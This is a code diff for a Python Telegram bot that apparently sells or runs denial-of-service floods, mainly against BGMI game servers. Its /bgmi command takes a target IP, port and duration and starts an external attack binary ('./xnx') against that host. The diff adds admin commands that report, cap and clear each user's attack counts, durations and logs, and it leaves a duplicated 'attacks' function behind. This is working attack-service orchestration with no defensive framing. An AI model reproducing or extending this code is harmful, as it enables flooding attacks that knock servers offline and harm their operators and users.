@@ -126,11 +126,11 @@ def fetch_data_from_mongo():
 
         # Fetch Logs
         logs = logs_collection.find()
-        print("Logs from MongoDB:")
+        '''print("Logs from MongoDB:")
         for log in logs:
             print(log)
     except Exception as e:
-            print("Error fetching logs:", e)
+            print("Error fetching logs:", e)'''
 
 
     except Exception as e:
@@ -148,7 +148,7 @@ def fetch_user_durations():
         global user_durations
         user_durations = {int(d["user_id"]): d["max_duration"] for d in durations}
         
-        print("User durations loaded from MongoDB:", user_durations)  # Debug line
+       # print("User durations loaded from MongoDB:", user_durations)  # Debug line
 
     except Exception as e:
         logging.error(f"Error fetching user durations from MongoDB: {str(e)}")
@@ -205,6 +205,8 @@ async def save_user_info(user_id, username):
 
 
 
+
+
 def load_attack_counts():
     global user_attack_counts
     if os.path.exists(ATTACKS_FILE):
@@ -253,55 +255,58 @@ async def save_attack_log(user_id, target_ip, port, duration):
 
 
 
+# Updated attacks command (Admin-only)
 async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not await ensure_correct_group(update, context):
         return
 
     user_id = update.message.from_user.id
     if user_id not in map(int, ADMIN_IDS):
-        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨ꜱ𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
         return
 
-    # Fetch attack data from MongoDB
-    global user_attack_counts
-    user_attack_counts = {}
-    attacks = attacks_collection.find()
-    for attack in attacks:
-        user_attack_counts[int(attack['user_id'])] = attack['attack_count']
+    try:
+        attacks = attacks_collection.find()
+        report_lines = []
+        grand_total = 0
 
-    # Prepare attack report
-    report_lines = []
-    grand_total = 0
+        for attack in attacks:
+            uid = attack.get('user_id', 'Unknown')
+            attack_count = attack.get('attack_count', 0)
+            grand_total += attack_count
 
-    for uid, count in user_attack_counts.items():
-        username = "Unknown"
-        display_name = "Unknown"
+            # Fetch user information from MongoDB
+            user = users_collection.find_one({"user_id": uid})
+            username = f"@{user['username']}" if user and user.get('username') else "Unknown"
+            name = "Unknown"
 
-        # Find user info
-        for u_id, u_name in read_users():
-            if int(u_id) == uid:
-                username = u_name
-                user = await context.bot.get_chat(uid)
-                display_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
-                break
+            # Attempt to get the user's full name from Telegram API if available
+            try:
+                chat = await context.bot.get_chat(uid)
+                name = f"{chat.first_name or ''} {chat.last_name or ''}".strip()
+            except Exception:
+                pass  # If fetching chat fails, default to "Unknown"
 
-        report_lines.append(
-            f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   @{username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {count}\n **************************"
-        )
-        grand_total += count
+            # Format the report entry
+            report_lines.append(
+                f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   {username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {attack_count}\n **************************"
+            )
 
-    report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")
+        report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")
 
-    if report_lines:
-        await update.message.reply_text("\n".join(report_lines))
-    else:
-        await update.message.reply_text("⚠️ 𝐧𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
+        if report_lines:
+            await update.message.reply_text("\n".join(report_lines))
+        else:
+            await update.message.reply_text("⚠️ 𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚: {str(e)}")
+
 
 
 
 async def start_attack(target_ip, port, duration, user_id, original_message, context):
     global active_attack
-    command = ['./xxxx', target_ip, str(port), str(duration)]
+    command = ['./xnx', target_ip, str(port), str(duration)]
 
     try:
         process = await asyncio.create_subprocess_exec(*command)
@@ -320,7 +325,7 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
 
         del user_processes[user_id]
         try:
-            await original_message.reply_text(f"✅ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐨𝐧​ {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.")
+            await original_message.reply_text(f"🛑 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐨𝐧​ 🛑\n 𝐇𝐎𝐒𝐓===>  {target_ip}\n𝐏𝐎𝐑𝐓===>  {port}\n𝐓𝐈𝐌𝐄===>  {duration}")
         except Exception:
             pass  # Silently ignore errors when sending the reply
 
@@ -352,7 +357,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text("👋 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐛𝐨𝐭!\n 𝐮𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤")
 
 # BGMI command handler
-# BGMI command handler with single attack restriction
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global active_attack
     if not await ensure_correct_group(update, context):
@@ -416,11 +420,12 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
 
     # Start attack
+     # Start attack
     attack_message = await update.message.reply_text(
-        f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧 {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬."
+        f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧 \n𝐇𝐎𝐒𝐓===> {target_ip}\n𝐏𝐎𝐑𝐓===> {port}\n𝐓𝐈𝐌𝐄===> {duration}\n𝐔𝐒𝐄𝐑===> {username}"
     )
-    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))
 
+    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))
 
 
 
@@ -470,8 +475,125 @@ async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     except ValueError:
         await update.message.reply_text("⚠️ 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐧 𝐢𝐧𝐭𝐞𝐠𝐞𝐫.")
 
+# Duration command to show users with max duration < 240
+async def duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await ensure_correct_group(update, context):
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in map(int, ADMIN_IDS):
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        return
+
+    try:
+        durations = db["durations"].find()
+        report_lines = []
+
+        if durations:
+            for duration in durations:
+                if duration is None:
+                    continue
+                uid = duration['user_id']
+                max_duration = duration.get('max_duration', 240)
+                
+                # Fetch user details
+                user = users_collection.find_one({"user_id": uid})
+                
+                if user:
+                    username = f"@{user.get('username', 'Unknown')}"
+                    display_name = user.get('display_name', user.get('username', 'Unknown'))
+
+                    report_lines.append(
+                        f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   {username}, \n𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡​:-   {max_duration}s\n **************************"
+                    )
+
+            if report_lines:
+                await update.message.reply_text("\n".join(report_lines))
+            else:
+                await update.message.reply_text("⚠️ 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐰𝐢𝐭𝐡 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 𝟐𝟒𝟎.")
+        else:
+            await update.message.reply_text("⚠️ 𝐍𝐨 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧𝐬 𝐟𝐨𝐮𝐧𝐝.")
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧𝐬: {str(e)}")
+
+
+
+
+
+# Clear duration command to reset a specific user's duration
+async def clear_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await ensure_correct_group(update, context):
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in map(int, ADMIN_IDS):
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        return
+
+    if len(context.args) != 1:
+        await update.message.reply_text("🛡️ 𝐔𝐬𝐚𝐠𝐞: /𝐜𝐥𝐞𝐚𝐫_𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 <𝐮𝐬𝐞𝐫_𝐢𝐝>")
+        return
+
+    target_user_id = context.args[0]
+
+    try:
+        # Reset max duration for the specified user
+        db["durations"].update_one(
+            {"user_id": target_user_id},
+            {"$set": {"max_duration": 240}},
+            upsert=True
+        )
+
+        await update.message.reply_text(f"✅ 𝐌𝐚𝐱 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐫𝐞𝐬𝐞𝐭 𝐭𝐨 𝟐𝟒𝟎 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫 𝐈𝐃: {target_user_id}.")
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐫𝐞𝐬𝐞𝐭𝐭𝐢𝐧𝐠 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {str(e)}")
+
+
+# Clear logs command (Admin-only)
+async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await ensure_correct_group(update, context):
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in map(int, ADMIN_IDS):
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        return
+
+    count = logs_collection.count_documents({})
+    logs_collection.delete_many({})
+    await update.message.reply_text(f"✅ 𝐋𝐨𝐠𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐓𝐨𝐭𝐚𝐥 𝐥𝐨𝐠𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝: {count}.")
+
+# Clear users command (Admin-only)
+async def clear_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await ensure_correct_group(update, context):
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in map(int, ADMIN_IDS):
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        return
+
+    count = users_collection.count_documents({})
+    users_collection.delete_many({})
+    await update.message.reply_text(f"✅ 𝐔𝐬𝐞𝐫𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐓𝐨𝐭𝐚𝐥 𝐮𝐬𝐞𝐫𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝: {count}.")
+
+# Clear attacks command (Admin-only)
+async def clear_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await ensure_correct_group(update, context):
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in map(int, ADMIN_IDS):
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        return
+
+    count = attacks_collection.count_documents({})
+    attacks_collection.delete_many({})
+    await update.message.reply_text(f"✅ 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝. 𝐓𝐨𝐭𝐚𝐥 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝: {count}.")
+
 
 # View logs command (Admin-only)
+# Updated logs command (Admin-only)
 async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not await ensure_correct_group(update, context):
         return
@@ -482,18 +604,19 @@ async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     try:
-        # Fetch logs from MongoDB
         logs = logs_collection.find()
         log_entries = [log['log'] for log in logs]
         if log_entries:
-            await update.message.reply_text(f"📊 Attack logs:\n" + "\n".join(log_entries))
+            await update.message.reply_text(f"📊 Logs:\n" + "\n".join(log_entries))
         else:
-            await update.message.reply_text("⚠️ 𝐧𝐨 𝐥𝐨𝐠𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
+            await update.message.reply_text("⚠️ 𝐍𝐨 𝐥𝐨𝐠𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
     except Exception as e:
-        await update.message.reply_text("⚠️ 𝐞𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐥𝐨𝐠𝐬.")
+        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐥𝐨𝐠𝐬: {str(e)}")
+
 
 
 # View users command (Admin-only)
+# Updated users command (Admin-only)
 async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not await ensure_correct_group(update, context):
         return
@@ -504,11 +627,63 @@ async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     try:
-        with open(USERS_FILE, "r") as f:
-            users = f.read()
-        await update.message.reply_text(f"👥 Users:\n{users}")
+        users = users_collection.find()
+        user_entries = [f"ID: {user['user_id']}, Username: {user['username']}" for user in users]
+        if user_entries:
+            await update.message.reply_text(f"👥 Users:\n" + "\n".join(user_entries))
+        else:
+            await update.message.reply_text("⚠️ 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
     except Exception as e:
-        await update.message.reply_text("⚠️ 𝐧𝐨 𝐮𝐬𝐞𝐫𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
+        await update.message.reply_text(f"⚠️ 𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐮𝐬𝐞𝐫𝐬: {str(e)}")
+
+
+# Updated attacks command (Admin-only)
+async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await ensure_correct_group(update, context):
+        return
+
+    user_id = update.message.from_user.id
+    if user_id not in map(int, ADMIN_IDS):
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨ꜱ𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
+        return
+
+    # Fetch attack data from MongoDB
+    global user_attack_counts
+    user_attack_counts = {}
+    attacks = attacks_collection.find()
+    for attack in attacks:
+        user_attack_counts[int(attack['user_id'])] = attack['attack_count']
+
+    # Prepare attack report
+    report_lines = []
+    grand_total = 0
+
+    for uid, count in user_attack_counts.items():
+        username = "Unknown"
+        display_name = "Unknown"
+
+        # Find user info
+        for u_id, u_name in read_users():
+            if int(u_id) == uid:
+                username = u_name
+                user = await context.bot.get_chat(uid)
+                display_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
+                break
+
+        report_lines.append(
+            f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   @{username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {count}\n **************************"
+        )
+        grand_total += count
+
+    report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")
+
+    if report_lines:
+        await update.message.reply_text("\n".join(report_lines))
+    else:
+        await update.message.reply_text("⚠️ 𝐧𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
+
+
+
 
 def handle_exit(sig, frame):
     logging.info("Saving data to MongoDB before shutting down...")
@@ -527,5 +702,11 @@ if __name__ == '__main__':
     app.add_handler(CommandHandler("set", set_duration))
     app.add_handler(CommandHandler("logs", logs))
     app.add_handler(CommandHandler("users", users))
-    app.add_handler(CommandHandler("attacks", attacks))  # New command
+    app.add_handler(CommandHandler("attacks", attacks)) 
+    app.add_handler(CommandHandler("clear_logs", clear_logs))
+    app.add_handler(CommandHandler("clear_users", clear_users))
+    app.add_handler(CommandHandler("clear_attacks", clear_attacks))
+    app.add_handler(CommandHandler("duration", duration))
+    app.add_handler(CommandHandler("clear_duration", clear_duration))
+
     app.run_polling()
